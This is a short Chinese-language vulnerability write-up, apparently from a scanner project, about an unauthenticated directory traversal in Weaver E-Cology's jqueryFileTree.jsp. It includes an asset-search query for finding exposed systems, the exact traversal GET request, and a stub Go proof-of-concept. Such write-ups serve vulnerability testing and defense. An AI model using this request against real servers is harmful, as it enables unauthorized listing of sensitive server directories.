---
source: "TD0U/WeaverScan"
---

# 泛微E-Cology jqueryFileTree.jsp 目录遍历漏洞

## 漏洞描述

泛微 E-Cology 的 `/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp` 接口中 `dir` 参数存在目录遍历漏洞。攻击者无需登录，通过构造 `../` 遍历路径即可列出服务器上的任意目录内容，获取敏感目录结构信息。

## 漏洞影响

```
泛微 E-Cology
```

## 网络测绘

```
app="泛微-协同办公OA"
```

## 漏洞复现

```
GET /js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=../../ HTTP/1.1
```

若响应返回目录列表内容，则漏洞存在。可继续遍历读取 `WEB-INF` 等敏感目录的结构信息。

参考 PoC（Go，来源 TD0U/WeaverScan）：

```go
func JqueryFileTree(target string) {
    url := target + "/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=../../"
    // GET 请求，响应返回目录列表即存在漏洞
}
```
